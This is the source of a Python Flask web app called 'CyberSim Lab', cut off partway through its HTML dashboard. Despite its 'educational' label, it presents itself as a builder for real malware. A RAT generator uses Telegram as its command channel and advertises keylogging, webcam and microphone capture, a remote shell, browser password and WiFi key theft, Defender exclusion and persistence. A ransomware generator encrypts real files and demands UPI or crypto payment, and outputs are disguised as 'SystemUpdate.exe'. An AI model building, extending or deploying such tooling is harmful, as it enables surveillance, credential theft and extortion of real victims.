#!/usr/bin/env python3
"""
CyberSim Lab - Cybersecurity Simulation Platform
Pure Python Flask Application (No Node.js Required)

Usage:
    pip install flask
    python app.py

Then open: http://localhost:5001
"""

from flask import Flask, render_template_string, request, send_file, jsonify
import json, random, string, hashlib, os, io, zipfile, base64, sys, tempfile, shutil, subprocess
from datetime import datetime

app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024  # 100MB max

# Path to the real Windows RAT template
RAT_TEMPLATE_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'rat_telegram_win.py')

# Template directory for all malware types
TEMPLATES_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')
RANSOMWARE_TEMPLATE = os.path.join(TEMPLATES_DIR, 'ransomware_template.py')
RAT_MACOS_TEMPLATE = os.path.join(TEMPLATES_DIR, 'rat_macos_template.py')
RAT_LINUX_TEMPLATE = os.path.join(TEMPLATES_DIR, 'rat_linux_template.py')


def read_template(path):
    """Read a template file and return its content"""
    if not os.path.exists(path):
        raise FileNotFoundError(f"Template not found: {path}")
    with open(path, 'r', encoding='utf-8') as f:
        return f.read()

# ============================================================
# HTML TEMPLATE - Full Dashboard
# ============================================================
HTML_TEMPLATE = r'''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CyberSim Lab - Cybersecurity Simulation Platform</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { background:#0a0e17; color:#c9d1d9; font-family:'Segoe UI',system-ui,sans-serif; min-height:100vh; }
::-webkit-scrollbar { width:6px; } ::-webkit-scrollbar-track { background:#0d1117; } ::-webkit-scrollbar-thumb { background:#30363d; border-radius:3px; }

/* Header */
.header { background:linear-gradient(135deg,#0d1117 0%,#161b22 100%); border-bottom:1px solid #21262d; padding:16px 24px; display:flex; align-items:center; gap:16px; }
.logo { font-size:20px; font-weight:700; color:#58a6ff; font-family:'Courier New',monospace; letter-spacing:1px; }
.logo span { color:#f0883e; }
.header-info { margin-left:auto; font-size:12px; color:#484f58; }

/* Tabs */
.tabs { display:flex; gap:0; background:#0d1117; border-bottom:1px solid #21262d; padding:0 24px; }
.tab { padding:12px 24px; cursor:pointer; font-family:'Courier New',monospace; font-size:13px; font-weight:600; border-bottom:2px solid transparent; color:#8b949e; transition:all .2s; }
.tab:hover { color:#c9d1d9; background:#161b22; }
.tab.active-green { color:#3fb950; border-bottom-color:#3fb950; }
.tab.active-red { color:#f85149; border-bottom-color:#f85149; }
.tab.active-purple { color:#bc8cff; border-bottom-color:#bc8cff; }
.tab.active-orange { color:#ff7b00; border-bottom-color:#ff7b00; }

/* Main */
.main { max-width:1400px; margin:0 auto; padding:24px; }
.module { display:none; } .module.active { display:block; }
.grid { display:grid; grid-template-columns:1fr 1fr; gap:24px; }
@media(max-width:900px) { .grid { grid-template-columns:1fr; } }

/* Cards */
.card { background:#0d1117; border:1px solid #21262d; border-radius:8px; overflow:hidden; }
.card-header { padding:16px 20px; border-bottom:1px solid #21262d; }
.card-title { font-family:'Courier New',monospace; font-size:14px; font-weight:600; display:flex; align-items:center; gap:8px; }
.card-title.green { color:#3fb950; } .card-title.red { color:#f85149; } .card-title.purple { color:#bc8cff; } .card-title.cyan { color:#58a6ff; }
.card-desc { font-size:11px; color:#484f58; margin-top:4px; }
.card-body { padding:20px; }

/* Form Elements */
.field { margin-bottom:16px; }
.label { font-size:12px; font-weight:600; margin-bottom:6px; display:block; }
.label.green { color:#3fb950; } .label.red { color:#f85149; } .label.purple { color:#bc8cff; }
select, input[type=text], input[type=number] { width:100%; background:#161b22; border:1px solid #30363d; color:#c9d1d9; padding:8px 12px; border-radius:6px; font-size:13px; font-family:'Courier New',monospace; outline:none; }
select:focus, input:focus { border-color:#58a6ff; }
.field-desc { font-size:10px; color:#484f58; margin-top:4px; }
.row { display:grid; grid-template-columns:1fr 1fr; gap:12px; }
.sep { border:none; border-top:1px solid #21262d; margin:16px 0; }

/* Buttons */
.btn { padding:10px 20px; border:none; border-radius:6px; cursor:pointer; font-family:'Courier New',monospace; font-size:13px; font-weight:600; transition:all .2s; display:inline-flex; align-items:center; gap:6px; }
.btn:disabled { opacity:0.5; cursor:not-allowed; }
.btn-green { background:#238636; color:#fff; } .btn-green:hover:not(:disabled) { background:#2ea043; }
.btn-red { background:#da3633; color:#fff; } .btn-red:hover:not(:disabled) { background:#f85149; }
.btn-purple { background:#8957e5; color:#fff; } .btn-purple:hover:not(:disabled) { background:#a371f7; }
.btn-outline { background:transparent; border:1px solid #30363d; color:#8b949e; } .btn-outline:hover { background:#161b22; color:#c9d1d9; }
.btn-sm { padding:6px 12px; font-size:11px; }
.btn-group { display:flex; gap:8px; margin-top:12px; }
.btn-row { display:grid; grid-template-columns:1fr 1fr; gap:8px; margin-top:12px; }

/* Badges */
.badges { display:flex; flex-wrap:wrap; gap:6px; margin-bottom:16px; }
.badge { padding:4px 10px; border:1px solid; border-radius:20px; font-size:10px; font-family:'Courier New',monospace; font-weight:600; }
.badge.green { border-color:#238636; color:#3fb950; background:rgba(35,134,54,0.1); }
.badge.red { border-color:#da3633; color:#f85149; background:rgba(218,54,51,0.1); }
.badge.purple { border-color:#8957e5; color:#bc8cff; background:rgba(137,87,229,0.1); }
.badge.cyan { border-color:#1f6feb; color:#58a6ff; background:rgba(31,111,235,0.1); }
.badge.yellow { border-color:#9e6a03; color:#d29922; background:rgba(158,106,3,0.1); }

/* Terminal */
.terminal { background:#010409; border:1px solid #21262d; border-radius:8px; overflow:hidden; }
.terminal-header { background:#161b22; padding:8px 16px; display:flex; align-items:center; gap:8px; border-bottom:1px solid #21262d; }
.terminal-dots { display:flex; gap:5px; }
.terminal-dots span { width:10px; height:10px; border-radius:50%; }
.terminal-dots span:nth-child(1) { background:#f85149; } .terminal-dots span:nth-child(2) { background:#d29922; } .terminal-dots span:nth-child(3) { background:#3fb950; }
.terminal-title { font-size:11px; color:#8b949e; font-family:'Courier New',monospace; margin-left:8px; }
.terminal-body { padding:12px 16px; max-height:500px; overflow-y:auto; font-family:'Courier New',monospace; font-size:12px; line-height:1.6; }
.line { white-space:pre-wrap; word-break:break-all; }
.line.command { color:#58a6ff; } .line.output { color:#c9d1d9; } .line.error { color:#f85149; }
.line.success { color:#3fb950; } .line.warning { color:#d29922; } .line.info { color:#8b949e; } .line.system { color:#bc8cff; }

/* Warning Banner */
.warn { padding:12px 16px; border-radius:8px; margin-bottom:20px; display:flex; align-items:flex-start; gap:10px; }
.warn.yellow { background:rgba(158,106,3,0.1); border:1px solid rgba(158,106,3,0.3); }
.warn.red { background:rgba(218,54,51,0.1); border:1px solid rgba(218,54,51,0.3); }
.warn.purple { background:rgba(137,87,229,0.1); border:1px solid rgba(137,87,229,0.3); }
.warn-icon { font-size:18px; flex-shrink:0; }
.warn-title { font-size:12px; font-weight:600; } .warn-title.yellow { color:#d29922; } .warn-title.red { color:#f85149; } .warn-title.purple { color:#bc8cff; }
.warn-text { font-size:10px; color:#8b949e; margin-top:4px; line-height:1.5; }

/* Download hint */
.hint { padding:10px 14px; border-radius:6px; margin-top:12px; font-family:'Courier New',monospace; font-size:10px; line-height:1.6; }
.hint.green { background:rgba(35,134,54,0.1); border:1px solid rgba(35,134,54,0.2); color:rgba(63,185,80,0.7); }
.hint.red { background:rgba(218,54,51,0.1); border:1px solid rgba(218,54,51,0.2); color:rgba(248,81,73,0.7); }
.hint.purple { background:rgba(137,87,229,0.1); border:1px solid rgba(137,87,229,0.2); color:rgba(188,140,255,0.7); }
.hint b { color:inherit; }

/* Switch */
.switch-row { display:flex; align-items:center; justify-content:space-between; padding:8px 12px; background:#161b22; border:1px solid #21262d; border-radius:6px; margin-bottom:8px; }
.switch-label { font-size:12px; color:#c9d1d9; } .switch-desc { font-size:10px; color:#484f58; }
.switch { position:relative; width:40px; height:22px; }
.switch input { opacity:0; width:0; height:0; }
.slider { position:absolute; inset:0; background:#30363d; border-radius:22px; cursor:pointer; transition:.3s; }
.slider:before { content:''; position:absolute; width:16px; height:16px; border-radius:50%; background:#8b949e; left:3px; top:3px; transition:.3s; }
.switch input:checked+.slider { background:#238636; }
.switch input:checked+.slider:before { transform:translateX(18px); background:#fff; }

/* Range slider */
input[type=range] { width:100%; -webkit-appearance:none; background:#21262d; height:4px; border-radius:2px; outline:none; margin-top:8px; }
input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:16px; height:16px; border-radius:50%; background:#3fb950; cursor:pointer; }

/* Token input special */
.token-input { font-size:14px !important; letter-spacing:0.5px; }
.token-input::placeholder { color:#30363d; }
.c2-status { display:flex; align-items:center; gap:8px; padding:10px 14px; border-radius:6px; margin-top:12px; font-family:'Courier New',monospace; font-size:11px; }
.c2-status.ready { background:rgba(35,134,54,0.15); border:1px solid rgba(35,134,54,0.3); color:#3fb950; }
.c2-status.empty { background:rgba(218,54,51,0.1); border:1px solid rgba(218,54,51,0.2); color:#f85149; }
.c2-dot { width:8px; height:8px; border-radius:50%; display:inline-block; }
.c2-dot.on { background:#3fb950; box-shadow:0 0 6px #3fb950; }
.c2-dot.off { background:#f85149; }

.cursor-blink::after { content:'_'; animation:blink 1s step-end infinite; color:#3fb950; }
@keyframes blink { 50% { opacity:0; } }

/* EXE Builder */
.exe-builder { background:#161b22; border:1px solid #21262d; border-radius:8px; margin-top:16px; overflow:hidden; }
.exe-builder-header { padding:12px 16px; border-bottom:1px solid #21262d; display:flex; align-items:center; gap:8px; cursor:pointer; }
.exe-builder-header:hover { background:#1c2129; }
.exe-builder-title { font-family:'Courier New',monospace; font-size:12px; font-weight:600; color:#58a6ff; }
.exe-builder-body { padding:16px; display:none; }
.exe-builder.open .exe-builder-body { display:block; }
.exe-cmd-box { background:#010409; border:1px solid #30363d; border-radius:6px; padding:12px 16px; font-family:'Courier New',monospace; font-size:11px; color:#3fb950; line-height:1.8; word-break:break-all; white-space:pre-wrap; position:relative; margin-bottom:12px; }
.exe-cmd-box .cmd-comment { color:#8b949e; }
.exe-cmd-box .cmd-highlight { color:#f0883e; }
.exe-cmd-box .cmd-warning { color:#d29922; }
.exe-step { display:flex; align-items:flex-start; gap:8px; padding:6px 0; }
.exe-step-num { background:#30363d; color:#58a6ff; width:20px; height:20px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:10px; font-weight:700; flex-shrink:0; margin-top:2px; }
.exe-step-text { font-size:11px; color:#c9d1d9; line-height:1.5; }
.exe-step-text code { background:#30363d; padding:1px 5px; border-radius:3px; color:#3fb950; font-size:10px; }
.exe-format-row { display:grid; grid-template-columns:1fr 1fr 1fr; gap:8px; margin-bottom:12px; }
.exe-fmt-opt { padding:8px 10px; background:#0d1117; border:1px solid #21262d; border-radius:6px; cursor:pointer; text-align:center; transition:all .2s; }
.exe-fmt-opt:hover { border-color:#58a6ff; }
.exe-fmt-opt.active { border-color:#58a6ff; background:rgba(31,111,235,0.1); }
.exe-fmt-opt .fmt-icon { font-size:18px; }
.exe-fmt-opt .fmt-name { font-size:10px; color:#8b949e; margin-top:4px; font-family:'Courier New',monospace; }
.exe-fmt-opt.active .fmt-name { color:#58a6ff; }
.copy-btn { position:absolute; top:8px; right:8px; background:#30363d; border:1px solid #484f58; color:#8b949e; padding:4px 10px; border-radius:4px; font-size:10px; cursor:pointer; font-family:'Courier New',monospace; }
.copy-btn:hover { background:#484f58; color:#fff; }
.copy-btn.copied { background:#238636; border-color:#238636; color:#fff; }
</style>
</head>
<body>

<!-- HEADER -->
<div class="header">
    <div class="logo">&gt;_<span>CyberSim</span> Lab</div>
    <div class="header-info">Educational Cybersecurity Simulation Platform | Kali Linux Testing</div>
</div>

<!-- TABS -->
<div class="tabs">
    <div class="tab active-red" onclick="switchTab('virus', this)" id="tab-virus">
        &#128360; Virus Simulation
    </div>
    <div class="tab" onclick="switchTab('rat', this)" id="tab-rat">
        &#128225; RAT Generator
    </div>
    <div class="tab" onclick="switchTab('ransomware', this)" id="tab-ransomware">
        &#128272; Ransomware Generator
    </div>
</div>

<!-- MAIN CONTENT -->
<div class="main">

<!-- ==================== VIRUS MODULE ==================== -->
<div class="module active" id="mod-virus">
    <div class="warn red">
        <div class="warn-icon">&#9760;</div>
        <div>
            <div class="warn-title red">Malware Behavioral Simulation</div>
            <div class="warn-text">Simulates malware behavior chains including infection, propagation, and persistence. No real malware generated. Sandbox only.</div>
        </div>
    </div>
    <div class="grid">
        <div class="card">
            <div class="card-header">
                <div class="card-title red">&#128027; Virus Configuration</div>
                <div class="card-desc">Configure malware simulation parameters</div>
            </div>
            <div class="card-body">
                <div class="field">
                    <div class="label red">Malware Type</div>
                    <select id="v-type" onchange="updateVirusDesc()">
                        <option value="ransomware">Ransomware (File Encryption)</option>
                        <option value="worm">Worm (Network Propagation)</option>
                        <option value="trojan_dropper">Trojan Dropper</option>
                        <option value="file_infector">File Infector</option>
                        <option value="rootkit">Rootkit (Kernel Stealth)</option>
                    </select>
                    <div class="field-desc" id="v-desc">Encrypts victim files and demands ransom payment.</div>
                </div>
                <hr class="sep">
                <div class="field">
                    <div class="label red">Target Operating System</div>
                    <select id="v-os" onchange="updateVirusBadges()">
                        <option value="windows">Windows 10/11</option>
                        <option value="linux">Linux (Ubuntu/Debian)</option>
                        <option value="macos">macOS</option>
                    </select>
                </div>
                <div class="field" id="v-algo-field">
                    <div class="label red">&#128274; Encryption Algorithm</div>
                    <select id="v-algo">
                        <option value="AES-256">AES-256 (Symmetric)</option>
                        <option value="RSA-2048">RSA-2048 (Asymmetric)</option>
                        <option value="ChaCha20">ChaCha20 (Stream Cipher)</option>
                        <option value="Blowfish">Blowfish (Block Cipher)</option>
                    </select>
                </div>
                <hr class="sep">
                <div class="field">
                    <div class="label red">Propagation Method</div>
                    <select id="v-prop">
                        <option value="email">Phishing Email</option>
                        <option value="usb">USB Drive (AutoRun)</option>
                        <option value="network_share">Network Share (SMB)</option>
                        <option value="p2p">P2P Botnet</option>
                    </select>
                </div>
                <hr class="sep">
                <div class="field">
                    <div class="label red">Stealth Level</div>
                    <select id="v-stealth">
                        <option value="basic">Basic (Easy Detection)</option>
                        <option value="intermediate" selected>Intermediate (Moderate)</option>
                        <option value="advanced">Advanced (High Evasion)</option>
                    </select>
                    <div class="field-desc">Basic: simple hiding. Advanced: kernel hooks, anti-forensics.</div>
                </div>
                <hr class="sep">
                <div class="field">
                    <div class="label red">&#129302; Telegram Bot Token</div>
                    <input type="text" id="v-token" class="token-input" placeholder="123456789:ABCdefGHIjklMNOpqrsTUVwxyz">
                    <div class="field-desc">From @BotFather (same as RAT/Ransomware)</div>
                </div>
                <div class="field">
                    <div class="label red">&#128100; Admin Chat ID</div>
                    <input type="text" id="v-chatid" placeholder="Your Telegram Chat ID">
                    <div class="field-desc">From @userinfobot or your bot</div>
                </div>
                <div class="field">
                    <div class="label red">&#128196; Fake Filename</div>
                    <input type="text" id="v-fakename" value="SystemUpdate" placeholder="SystemUpdate">
                    <div class="field-desc">Output filename (no extension needed)</div>
                </div>
                <div class="btn-group">
                    <button class="btn btn-red" onclick="runVirusSim()" id="v-run-btn">&#9654; Run Simulation</button>
                    <button class="btn btn-outline" onclick="resetTerminal('virus')">&#8634; Reset</button>
                </div>
                <div id="v-download-area" style="display:none">
                    <div class="btn-row">
                        <button class="btn btn-red btn-sm" onclick="downloadScript('virus')">&#128424; Download .py Script</button>
                        <button class="btn btn-red btn-sm" onclick="downloadReport('virus')">&#128229; Download Report</button>
                        <button class="btn btn-red btn-sm" onclick="downloadVirusBinary()" id="v-bin-btn">&#128190; Download Binary</button>
                    </div>
                    <div class="hint red">
                        &#128161; <b>.py:</b> <code>sudo python3 virus_sim.py</code><br>
                        <b>Binary:</b> Download .sh (Linux) / .exe (Windows) / .command (macOS) based on OS dropdown<br>
                        Analyze: <b>ps aux, netstat, find, strace, file</b>
                    </div>
                </div>
            </div>
        </div>
        <div>
            <div class="badges" id="v-badges">
                <span class="badge red">RANSOMWARE</span>
                <span class="badge cyan">WINDOWS</span>
                <span class="badge yellow">EMAIL</span>
                <span class="badge purple">Stealth: intermediate</span>
            </div>
            <div class="terminal">
                <div class="terminal-header">
                    <div class="terminal-dots"><span></span><span></span><span></span></div>
                    <div class="terminal-title">Malware Simulation Engine</div>
                </div>
                <div class="terminal-body" id="virus-terminal"><span class="line info" style="color:#30363d;">Waiting for virus simulation...</span></div>
            </div>
        </div>
    </div>
</div>

<!-- ==================== RAT MODULE (NEW - Windows RAT Generator) ==================== -->
<div class="module" id="mod-rat">
    <div class="warn purple">
        <div class="warn-icon">&#128225;</div>
        <div>
            <div class="warn-title purple">RAT Generator - Telegram Bot C2 v5.0 (Multi-OS)</div>
            <div class="warn-text">Generates a real RAT script controlled via Telegram Bot for Windows, macOS, and Linux. Requires your Bot Token and Chat ID. Educational cybersecurity lab only.</div>
        </div>
    </div>
    <div class="grid">
        <div class="card">
            <div class="card-header">
                <div class="card-title purple">&#128225; Telegram C2 Configuration</div>
                <div class="card-desc">Enter your Telegram Bot credentials to generate the RAT</div>
            </div>
            <div class="card-body">
                <!-- C2 Credentials -->
                <div class="field">
                    <div class="label purple">&#129302; Telegram Bot Token</div>
                    <input type="text" id="r-token" class="token-input" placeholder="123456789:ABCdefGHIjklMNOpqrsTUVwxyz" oninput="updateC2Status()">
                    <div class="field-desc">Get from @BotFather on Telegram. Format: TOKEN:SECRET</div>
                </div>
                <div class="field">
                    <div class="label purple">&#128100; Admin Chat ID</div>
                    <input type="text" id="r-chatid" class="token-input" placeholder="123456789" oninput="updateC2Status()">
                    <div class="field-desc">Your Telegram user/group ID. Get from @userinfobot</div>
                </div>

                <!-- C2 Status Indicator -->
                <div class="c2-status empty" id="c2-status">
                    <span class="c2-dot off" id="c2-dot"></span>
                    <span id="c2-status-text">BOT_TOKEN and CHAT_ID required</span>
                </div>

                <hr class="sep">

                <!-- OS & Port Selection -->
                <div class="row">
                    <div class="field">
                        <div class="label purple">Target OS</div>
                        <select id="r-os" onchange="updateRatBadges()">
                            <option value="windows">Windows 10/11</option>
                            <option value="macos">macOS</option>
                            <option value="linux">Linux (Ubuntu/Kali)</option>
                        </select>
                        <div class="field-desc">Select target operating system</div>
                    </div>
                    <div class="field">
                        <div class="label purple">C2 Port</div>
                        <select id="r-port" onchange="updateRatBadges()">
                            <option value="443">443 (HTTPS)</option>
                            <option value="8080">8080 (HTTP Alt)</option>
                            <option value="8443">8443 (HTTPS Alt)</option>
                            <option value="1337">1337 (Custom)</option>
                            <option value="9999">9999 (Custom)</option>
                            <option value="0">Auto (Telegram Default)</option>
                        </select>
                        <div class="field-desc">Telegram API uses HTTPS port 443</div>
                    </div>
                </div>

                <hr class="sep">

                <!-- RAT Info -->
                <div class="field">
                    <div class="label purple">RAT Details</div>
                    <div class="badges" id="r-detail-badges">
                        <span class="badge purple">TELEGRAM C2</span>
                        <span class="badge cyan" id="r-os-badge">WINDOWS</span>
                        <span class="badge green">PYTHON</span>
                        <span class="badge yellow">v5.0 STEALTH</span>
                        <span class="badge cyan" id="r-port-badge">PORT: 443</span>
                    </div>
                </div>

                <hr class="sep">

                <!-- Features List -->
                <div class="field">
                    <div class="label purple">Included Features (30+ Commands)</div>
                    <div class="switch-row"><div><div class="switch-label">&#128247; Screenshot / Webcam / Video</div><div class="switch-desc">3 capture methods with auto-fallback</div></div><label class="switch"><input type="checkbox" checked disabled><span class="slider"></span></label></div>
                    <div class="switch-row"><div><div class="switch-label">&#9000; Keylogger</div><div class="switch-desc">pynput based, persistent logging</div></div><label class="switch"><input type="checkbox" checked disabled><span class="slider"></span></label></div>
                    <div class="switch-row"><div><div class="switch-label">&#127908; Microphone Live</div><div class="switch-desc">pyaudio + ffmpeg ogg recording</div></div><label class="switch"><input type="checkbox" checked disabled><span class="slider"></span></label></div>
                    <div class="switch-row"><div><div class="switch-label">&#128187; Remote Shell</div><div class="switch-desc">Execute any cmd/ps command</div></div><label class="switch"><input type="checkbox" checked disabled><span class="slider"></span></label></div>
                    <div class="switch-row"><div><div class="switch-label">&#128193; File Manager</div><div class="switch-desc">Browse, download, upload files</div></div><label class="switch"><input type="checkbox" checked disabled><span class="slider"></span></label></div>
                    <div class="switch-row"><div><div class="switch-label">&#128274; Passwords &amp; WiFi</div><div class="switch-desc">Chrome/Edge/Firefox data, WiFi keys</div></div><label class="switch"><input type="checkbox" checked disabled><span class="slider"></span></label></div>
                    <div class="switch-row"><div><div class="switch-label">&#128274; Notifications</div><div class="switch-desc">Read Windows notifications live</div></div><label class="switch"><input type="checkbox" checked disabled><span class="slider"></span></label></div>
                    <div class="switch-row"><div><div class="switch-label">&#128680; Anti-Kill Watchdog</div><div class="switch-desc">Auto-restart if process killed</div></div><label class="switch"><input type="checkbox" checked disabled><span class="slider"></span></label></div>
                </div>

                <hr class="sep">

                <div class="field">
                    <div class="label purple">Stealth Features (Auto-Setup with --install)</div>
                    <div class="switch-row"><div><div class="switch-label" style="color:#bc8cff;">&#128274; Windows Defender Exclusion</div><div class="switch-desc">Auto-add path + process exclusion</div></div><label class="switch"><input type="checkbox" checked disabled><span class="slider"></span></label></div>
                    <div class="switch-row"><div><div class="switch-label" style="color:#bc8cff;">&#128293; Firewall Auto-Allow</div><div class="switch-desc">Silent netsh rule creation</div></div><label class="switch"><input type="checkbox" checked disabled><span class="slider"></span></label></div>
                    <div class="switch-row"><div><div class="switch-label" style="color:#bc8cff;">&#128190; Triple Persistence</div><div class="switch-desc">Registry + Startup + Task Scheduler</div></div><label class="switch"><input type="checkbox" checked disabled><span class="slider"></span></label></div>
                    <div class="switch-row"><div><div class="switch-label" style="color:#bc8cff;">&#128064; No CMD Window</div><div class="switch-desc">pythonw.exe + CREATE_NO_WINDOW</div></div><label class="switch"><input type="checkbox" checked disabled><span class="slider"></span></label></div>
                    <div class="switch-row"><div><div class="switch-label" style="color:#bc8cff;">&#128736; Auto-Install Deps</div><div class="switch-desc">pip install requests, pynput, etc.</div></div><label class="switch"><input type="checkbox" checked disabled><span class="slider"></span></label></div>
                    <div class="switch-row"><div><div class="switch-label" style="color:#bc8cff;">&#128172; Start/Stop Notifications</div><div class="switch-desc">Telegram msg on startup/shutdown</div></div><label class="switch"><input type="checkbox" checked disabled><span class="slider"></span></label></div>
                </div>

                <div class="btn-group">
                    <button class="btn btn-purple" onclick="generateRat()" id="r-gen-btn" style="width:100%">&#9889; Generate RAT Script</button>
                </div>

                <div id="r-download-area" style="display:none">
                    <!-- OS-AWARE DIRECT BINARY DOWNLOAD -->
                    <div style="padding:16px;background:rgba(35,134,54,0.08);border:1px solid rgba(35,134,54,0.25);border-radius:8px;" id="exe-kit-box">
                        <div style="display:flex;align-items:center;gap:8px;margin-bottom:10px;">
                            <span style="font-size:18px;">&#128230;</span>
                            <span style="font-family:'Courier New',monospace;font-size:13px;font-weight:700;color:#3fb950;" id="exe-kit-title">Direct EXE Download</span>
                        </div>
                        <div style="font-size:11px;color:#8b949e;margin-bottom:12px;line-height:1.5;" id="exe-kit-desc">
                            Server pe binary build hoke direct download hota hai. Koi ZIP nahi, koi .py nahi!<br>
                            Output: <code style="color:#58a6ff;" id="exe-kit-name-preview">SystemUpdate.exe</code> (~18 MB)<br>
                            <span style="color:#d29922;" id="exe-kit-note">First build: 30-60 sec. After: instant!</span>
                        </div>
                        <div class="row" style="margin-bottom:12px;">
                            <div class="field" style="margin-bottom:0;">
                                <div class="label" style="color:#3fb950;">File Name</div>
                                <input type="text" id="exe-name" value="SystemUpdate" oninput="updateExePreview()">
                            </div>
                        </div>
                        <button class="btn btn-green" onclick="downloadBinary()" id="exe-kit-btn" style="width:100%;justify-content:center;">
                            &#128230; Download .exe Direct
                        </button>
                        <div style="margin-top:10px;font-size:10px;color:#484f58;font-family:'Courier New',monospace;text-align:center;" id="exe-kit-status"></div>
                    </div>
                </div>
            </div>
        </div>
        <div>
            <div class="badges" id="r-badges">
                <span class="badge purple">TELEGRAM C2</span>
                <span class="badge cyan">WINDOWS</span>
                <span class="badge green">v5.0 STEALTH</span>
                <span class="badge yellow">30+ COMMANDS</span>
                <span class="badge red">FULL PERSISTENCE</span>
            </div>
            <div class="terminal">
                <div class="terminal-header">
                    <div class="terminal-dots"><span></span><span></span><span></span></div>
                    <div class="terminal-title" id="rat-term-title">RAT Generator</div>
                </div>
                <div class="terminal-body" id="rat-terminal"><span class="line info" style="color:#30363d;">Enter BOT_TOKEN + CHAT_ID, then click Generate...</span></div>
            </div>
        </div>
    </div>
</div>

<!-- ==================== RANSOMWARE MODULE (Telegram C2 Ransomware Generator) ==================== -->
<div class="module" id="mod-ransomware">
    <div class="warn" style="border-color:rgba(255,123,0,0.4);background:rgba(255,123,0,0.06);">
        <div class="warn-icon" style="color:#ff7b00;">&#128272;</div>
        <div>
            <div class="warn-title" style="color:#ff7b00;">Ransomware Generator - Telegram Bot C2 v5.0 (Multi-OS)</div>
            <div class="warn-text">Generates a real ransomware script controlled via Telegram Bot for Windows, macOS, and Linux. Real file encryption with remote unlock. Educational cybersecurity lab only.</div>
        </div>
    </div>
    <div class="grid">
        <div class="card">
            <div class="card-header">
                <div class="card-title" style="color:#ff7b00;">&#128272; Ransomware C2 Configuration</div>
                <div class="card-desc">Configure Telegram C2 + encryption settings</div>
            </div>
            <div class="card-body">
                <div class="field">
                    <div class="label" style="color:#ff7b00;">&#129302; Telegram Bot Token</div>
                    <input type="text" id="rw-token" class="token-input" placeholder="123456789:ABCdefGHIjklMNOpqrsTUVwxyz" oninput="updateRansomC2Status()">
                    <div class="field-desc">Get from @BotFather on Telegram</div>
                </div>
                <div class="field">
                    <div class="label" style="color:#ff7b00;">&#128100; Admin Chat ID</div>
                    <input type="text" id="rw-chatid" class="token-input" placeholder="123456789" oninput="updateRansomC2Status()">
                    <div class="field-desc">Your Telegram user/group ID</div>
                </div>
                <div class="c2-status empty" id="rw-c2-status">
                    <span class="c2-dot off" id="rw-c2-dot"></span>
                    <span id="rw-c2-status-text">BOT_TOKEN and CHAT_ID required</span>
                </div>
                <hr class="sep">
                <div class="row">
                    <div class="field">
                        <div class="label" style="color:#ff7b00;">Target OS</div>
                        <select id="rw-os" onchange="updateRansomwareBadges()">
                            <option value="windows">Windows 10/11</option>
                            <option value="linux">Linux (Ubuntu/Kali)</option>
                            <option value="macos">macOS</option>
                        </select>
                    </div>
                    <div class="field">
                        <div class="label" style="color:#ff7b00;">Encryption</div>
                        <select id="rw-algo" onchange="updateRansomwareBadges()">
                            <option value="xor">XOR Cipher (Fast)</option>
                            <option value="aes">AES-256 (Strong)</option>
                        </select>
                    </div>
                </div>
                <div class="row">
                    <div class="field">
                        <div class="label" style="color:#ff7b00;">Ransom Amount</div>
                        <input type="text" id="rw-amount" value="500" placeholder="500">
                    </div>
                    <div class="field">
                        <div class="label" style="color:#ff7b00;">Payment Method</div>
                        <select id="rw-method">
                            <option value="upi">UPI (GPay/PhonePe/Paytm)</option>
                            <option value="bitcoin">Bitcoin (BTC)</option>
                            <option value="ethereum">Ethereum (ETH)</option>
                            <option value="monero">Monero (XMR)</option>
                        </select>
                    </div>
                </div>
                <div class="field">
                    <div class="label" style="color:#ff7b00;">UPI ID / Wallet Address</div>
                    <input type="text" id="rw-upi" value="" placeholder="yourname@upi or BTC wallet address">
                    <div class="field-desc">UPI ID for GPay/PhonePe OR crypto wallet address</div>
                </div>
                <hr class="sep">
                <div class="field">
                    <div class="label" style="color:#ff7b00;">Included Features</div>
                    <div class="switch-row"><div><div class="switch-label" style="color:#ff7b00;">&#128274; Real File Encryption</div><div class="switch-desc">Encrypts user files in real directories</div></div><label class="switch"><input type="checkbox" checked disabled><span class="slider"></span></label></div>
                    <div class="switch-row"><div><div class="switch-label" style="color:#ff7b00;">&#128196; Ransom Popup</div><div class="switch-desc">HTML popup with UPI/payment on file open</div></div><label class="switch"><input type="checkbox" checked disabled><span class="slider"></span></label></div>
                    <div class="switch-row"><div><div class="switch-label" style="color:#ff7b00;">&#128172; Telegram C2 /unlock</div><div class="switch-desc">Remote unlock + /status + /info</div></div><label class="switch"><input type="checkbox" checked disabled><span class="slider"></span></label></div>
                    <div class="switch-row"><div><div class="switch-label" style="color:#ff7b00;">&#128680; Self-Delete on /unlock</div><div class="switch-desc">Ransomware + key + persistence auto-delete after decrypt</div></div><label class="switch"><input type="checkbox" checked disabled><span class="slider"></span></label></div>
                </div>
                <hr class="sep">
                <div class="field">
                    <div class="label" style="color:#ff7b00;">Stealth Features (--install)</div>
                    <div class="switch-row"><div><div class="switch-label" style="color:#ffa54c;">&#128274; Triple Persistence</div><div class="switch-desc">Registry + Startup + Task Scheduler</div></div><label class="switch"><input type="checkbox" checked disabled><span class="slider"></span></label></div>
                    <div class="switch-row"><div><div class="switch-label" style="color:#ffa54c;">&#128293; Defender + Firewall</div><div class="switch-desc">Exclusion + silent netsh allow</div></div><label class="switch"><input type="checkbox" checked disabled><span class="slider"></span></label></div>
                    <div class="switch-row"><div><div class="switch-label" style="color:#ffa54c;">&#128064; No CMD Window</div><div class="switch-desc">pythonw.exe + CREATE_NO_WINDOW</div></div><label class="switch"><input type="checkbox" checked disabled><span class="slider"></span></label></div>
                    <div class="switch-row"><div><div class="switch-label" style="color:#ffa54c;">&#128736; Auto-Install Deps</div><div class="switch-desc">pip install requests + pycryptodome</div></div><label class="switch"><input type="checkbox" checked disabled><span class="slider"></span></label></div>
                </div>
                <div class="btn-group">
                    <button class="btn" style="background:#ff7b00;color:#fff;" onclick="generateRansomware()" id="rw-gen-btn" style="width:100%">&#9889; Generate Ransomware Script</button>
                </div>
                <div id="rw-download-area" style="display:none">
                    <div class="btn-row">
                        <button class="btn" style="background:#ff7b00;color:#fff;" onclick="downloadRansomwareReport()">&#128229; Download Report</button>
                    </div>
